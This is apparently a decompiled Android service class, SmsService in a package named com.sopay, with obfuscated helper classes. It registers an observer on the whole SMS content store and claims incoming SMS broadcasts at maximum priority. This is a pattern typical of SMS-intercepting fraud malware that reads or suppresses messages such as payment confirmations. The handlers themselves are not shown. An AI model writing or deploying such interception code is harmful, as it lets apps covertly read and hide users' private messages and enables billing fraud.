package com.sopay;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.IBinder;
import android.os.Process;

public class SmsService
  extends Service
{
  private boolean a = false;
  private o b;
  
  public SmsService() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    getContentResolver().unregisterContentObserver(this.b);
    Process.killProcess(Process.myPid());
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (!this.a)
    {
      this.a = true;
      Object localObject = getContentResolver();
      this.b = new o((ContentResolver)localObject, new m(this));
      ((ContentResolver)localObject).registerContentObserver(Uri.parse("content://sms/"), true, this.b);
      localObject = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
      ((IntentFilter)localObject).setPriority(Integer.MAX_VALUE);
      registerReceiver(new j(), (IntentFilter)localObject);
    }
    return super.onStartCommand(paramIntent, 1, paramInt2);
  }
}
